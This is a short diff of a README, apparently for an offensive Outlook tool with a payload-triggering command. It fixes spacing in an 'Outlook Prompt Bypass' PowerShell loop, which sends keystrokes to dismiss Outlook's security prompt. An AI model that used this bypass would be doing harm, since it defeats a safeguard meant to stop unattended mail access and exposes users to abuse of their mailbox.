@@ -133,12 +133,12 @@ New-DynamicOutlookTrigger -Triggerwords blabla1,blabla2,blabla3 -payload c:\wind
 
 ## Outlook Prompt Bypass
 ```
-sleep4
+sleep 4
 for (;;) {
 
 $wshell = new-object -ComObject wscript.shell;
 $wshell.AppActivate("Microsoft Outlook")
-sleep1
+sleep 1
 $wshell.sendkeys("{TAB}")
 $wshell.sendkeys("{TAB}")
 $wshell.sendkeys(" ")
